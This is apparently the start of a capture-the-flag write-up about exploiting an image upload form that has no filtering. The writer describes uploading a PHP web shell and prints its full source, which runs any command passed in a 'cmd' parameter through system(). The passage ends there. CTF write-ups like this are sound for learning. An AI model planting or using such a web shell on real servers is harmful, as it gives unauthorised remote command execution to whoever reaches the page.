0. The Challenge Description

The image description has nothing odd until the end of it, It says hidden vulnerability in meta data, Aka We can sneak a PHP Code into an image or a .php file and it gets executed most likely.

1. The Upload Form

We are greeted by a very simple image upload page with absolutely no client-side filtering visible in the source code.

I decided to test whether unrestricted file uploads were actually in effect, Uploaded a PHP-Shell. Below is a simple example of what the important part looks like 

<html>
<body>
  <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
  <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
  <input type="SUBMIT" value="Execute">
  </form>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</body>
</html>
Reference: https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
